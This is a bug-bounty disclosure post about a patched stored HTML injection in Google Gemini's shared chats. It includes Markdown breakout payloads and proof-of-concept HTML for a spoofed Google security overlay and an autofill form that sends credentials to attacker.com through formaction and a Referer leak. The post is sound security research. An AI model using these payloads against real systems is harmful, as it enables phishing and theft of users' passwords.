---

title: "Credential Leak in Gemini: $13,337 Bug Bounty"
date: "Nov 20, 2025"
category: "Bug Bounty"
tags: ["XSS", "HTMLi", "Google VRP"]
excerpt: "Deep dive into discovering and reporting a critical stored HTML injection vulnerability in Google Gemini."
---

On July 4, 2025, I discovered a critical stored HTML injection vulnerability in Google Gemini that allowed attackers to inject arbitrary HTML through improperly sanitized Markdown rendering. This vulnerability enabled sophisticated phishing attacks through Gemini's chat sharing feature, ultimately earning recognition from Google's VRP panel with a reward of **$13,337** for its high exploitation likelihood and abuse-related impact.

## Vulnerability Overview

The vulnerability stemmed from inadequate sanitization of Markdown input in Gemini's chat interface. By crafting payloads with prematurely closed code blocks and raw HTML tags, attackers could break out of Markdown formatting constraints and inject malicious HTML that persisted when shared via Gemini's official share links.

### Key Details

- **Type:** Stored HTML Injection via Markdown sanitization bypass
- **Attack Vector:** Malicious payload embedded in shared chat conversations
- **Trigger Condition:** Victim opens shared Gemini chat link
- **Reward:** $13,337

---

## Technical Analysis

### The Vulnerability

Gemini's Markdown renderer failed to properly sanitize HTML-like content within code blocks. The application appeared to process Markdown by injecting URLs and content into code blocks, but the sanitization layer could be bypassed using prematurely terminated code fence markers.

#### Payload Structure:

~~~markdown
```
  test
```
```
````

<div style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; ...">
    <!-- Malicious HTML content -->
</div>
~~~

The payload exploited a parsing inconsistency where the Markdown processor would close the code block early, allowing subsequent HTML to render directly in the DOM without escaping.

### Evolution of the Bug

Initially, limited HTML injection was possible using specific tags like the `immersive` tag within Markdown code blocks. However, after a platform update, the vulnerability expanded to allow direct HTML injection without requiring specific wrapper elements. This regression introduced the more severe exploitation path.

## Attack Scenarios

### UI Spoofing for Social Engineering

The most straightforward exploitation created fullscreen overlays mimicking Google's security prompts:

```html
<div style="
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: #f9d6d5;
    z-index: 9999;
">
    <h1>Security Verification Required</h1>
    <p>To protect your account, please confirm the beginning of your password:</p>
    <div>
        <a href="https://attacker.com/leak?answer=abc">abc</a>
        <a href="https://attacker.com/leak?answer=123">123</a>
        <a href="https://attacker.com/leak?answer=password">password</a>
        <a href="https://attacker.com/leak?answer=other">Other</a>
    </div>
</div>
```

This approach leveraged Google's brand trust to convince users they were interacting with a legitimate security workflow.

### Advanced Credential Exfiltration via Browser Autofill

During my research, I discovered a more sophisticated attack chain that exploited browser autofill behavior in combination with CSP bypass techniques:

#### Attack Flow:

1. **Form Injection:** Inject legitimate-looking input fields with `type="text"` and `type="password"` attributes
2. **Autofill Trigger:** Modern browsers (Chrome, Edge, Firefox) automatically populate saved credentials into these fields
3. **Exfiltration via formaction:** Use the `formaction` attribute on submit buttons to override form action despite CSP `form-action` restrictions
4. **Silent Data Leak:** Deploy invisible `<img>` tags with `referrerpolicy="unsafe-url"` to leak query parameters containing autofilled credentials

#### Critical Detail - Firefox Behavior:

Firefox prioritizes inline `referrerpolicy` attributes over server-set Referrer-Policy headers. This meant that even with proper headers, Firefox would leak the full URL (including autofilled credentials in query strings) via the Referer header when loading the invisible image from an attacker-controlled domain.

#### Proof of Concept:

```html
<form>
    <input type="text" name="username" />
    <input type="password" name="password" />
    <button formaction="https://attacker.com/collect">Verify</button>
</form>
<img src="https://attacker.com/pixel.gif" 
     referrerpolicy="unsafe-url" 
     style="opacity:0; position:absolute;" />
```

When a victim opened the shared link, their browser would:
- Autofill saved credentials into the injected form
- User clicks the crafted button, adding credentials to URL query string
- Invisible image loads, sending full URL (with credentials) via Referer header to attacker's server

## Disclosure Timeline

| Date | Event |
|------|-------|
| July 4, 2025 | Initial report submitted to Google VRP |
| July 4, 2025 | Report triaged as Abuse Risk by Trust & Safety team |
| July 15, 2025 | Report accepted, bug filed with product team |
| August 6, 2025 | Vulnerability patched, HTML injection no longer renders |
| September 18, 2025 | Reward issued: **$13,337** |
| September 18, 2025 | Confirmed 90-day disclosure window |
| November 19, 2025 | Planned public disclosure date |

## Conclusion

This vulnerability demonstrates that even without JavaScript execution, HTML injection in trusted contexts can enable sophisticated credential theft and phishing attacks. The combination of stored persistence, zero-click exploitation, and platform trust made this a high-impact finding worthy of Google's VRP recognition.

The $13,337 reward reflects the panel's assessment of "high exploitation likelihood" and "high impact" in an abuse context.